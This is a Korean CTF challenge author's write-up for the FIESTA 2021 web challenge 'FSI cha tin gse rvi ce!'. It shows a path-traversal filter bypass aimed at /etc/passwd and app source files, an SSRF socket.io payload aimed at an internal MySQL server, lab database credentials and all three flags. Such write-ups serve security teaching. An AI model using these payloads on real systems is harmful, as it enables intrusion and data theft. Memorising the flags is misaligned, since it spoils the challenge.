@@ -1,0 +1,130 @@
+---
+title: "금융보안원 FIESTA 2021 - 출제자 Writeup"
+description: "FSI cha tin gse rvi ce! 웹해킹 문제 출제자 풀이 - SSRF로 MySQL 임의 쿼리 실행"
+date: 2021-11-15
+tags: ["fiesta", "ssrf", "mysql", "web-security"]
+ctf: "FIESTA 2021"
+published: true
+---
+
+# 금융보안원 FIESTA 2021 - FSI cha tin gse rvi ce! 출제자 Write-up
+
+혹 로컬에 올려서 문제를 풀어보실분은 아래 깃헙 링크로 접속하면 문제 원본을 받을 수 있습니다.
+
+**GitHub:** https://github.com/JaewookYou/fiesta2021_webchall_FSI-cha-tin-gse-rvi-ce
+
+## 문제 정보
+
+- **문제명:** FSI cha tin gse rvi ce!
+- **출제자:** 보안평가2팀 주임 유재욱
+- **출제분야:** 웹해킹
+- **총배점:** 600점
+  - Flag1(100점): `fiesta{ok_y0u_g0t_the_ext_server's_code!_lets_dig_the_2nd_flag!}`
+  - Flag2(100점): `fiesta{congrat_y0u_g0t_all_of_th3_ext&int_server's_code!}`
+  - Flag3(400점): `fiesta{mysql_int3rner_1s_s0_fun_isnt_1t?}`
+
+## 문제 컨셉
+
+- 전체 문제 서비스의 큰 틀은 **채팅 서비스**
+- 여러 금융 기관의 취약점 분석 평가 도중 마주쳤던 채팅상담 서비스의 환경과 비슷한 맥락으로 구성
+- 외부의 채팅상담 서비스를 가져와 Integration 하는 구조
+- 이러한 환경에서, **SSRF(Server Side Request Forgery)** 취약점이 존재한다면 발생하는 위협이 핵심 문제 해결 포인트
+
+## 문제 환경
+
+- Python Flask
+- flask_socketio(외부망) / socketserver(내부망) / mysql(DB)
+- Client → 웹서버 → 내부망 채팅 API 서버 → 채팅 Database
+
+---
+
+## Flag 1: 외부망 소스코드 유출 (100점)
+
+### 취약점 발견
+
+filename 파라미터에 `'`와 `..`를 필터링하지만:
+- `'` 문자는 삭제됨
+- `..`도 삭제됨
+
+### 우회 방법
+
+```
+.'./  →  ../
+```
+
+`.'./.'./.'./.'./.'./.'./.'./.'./.'./.'./.'./etc/passwd` 입력 시:
+→ `../../../../../../../../etc/passwd`로 변환
+
+### 결과
+
+```
+/app/ext_app/app.py
+```
+읽어서 외부망 소스코드 및 첫 번째 플래그 획득!
+
+---
+
+## Flag 2: 내부망 소스코드 유출 (100점)
+
+### 취약점
+
+회원가입 시 프로필 이미지 업로드 filename에 동일한 우회 기법 적용
+
+### Exploit
+
+```
+/getProfileImage?id={userid}
+```
+
+filename에 `.'./.'./.'./app/int_app/app.py` 입력 → 내부망 소스코드 유출!
+
+---
+
+## Flag 3: SSRF로 MySQL 임의 쿼리 실행 (400점)
+
+### 취약점 분석
+
+```python
+# ext_app/app.py
+@socket_io.on("join")
+def join(content):
+    if 'chatserver' in content:
+        chatserver = content['chatserver']
+        t = chatserver.split(':')
+        flask.session["host"] = (t[0], int(t[1]))
+        users[flask.session["uuid"]] = socket.socket(...)
+        users[flask.session["uuid"]].connect(flask.session["host"])
+```
+
+**chatserver 파라미터로 임의 호스트에 연결 가능!**
+
+### Exploit
+
+```javascript
+var data = {
+    'channel': uuid, 
+    'userid': userid, 
+    'chatserver': '172.22.0.5:3306'
+};
+sock.emit("join", data);
+```
+
+내부망 소스코드에서 DB 정보 획득:
+```python
+user = 'chatdb_admin'
+passwd = 'th1s_1s_ch4tdb_4dm1n_p4ssw0rd'
+host = '172.22.0.5'
+```
+
+### MySQL Protocol 구현
+
+MySQL native password 해싱:
+```
+SHA1(password) XOR SHA1("20-bytes random data from server" + SHA1(SHA1(password)))
+```
+
+### 최종 Flag
+
+```
+fiesta{mysql_int3rner_1s_s0_fun_isnt_1t?}
+```
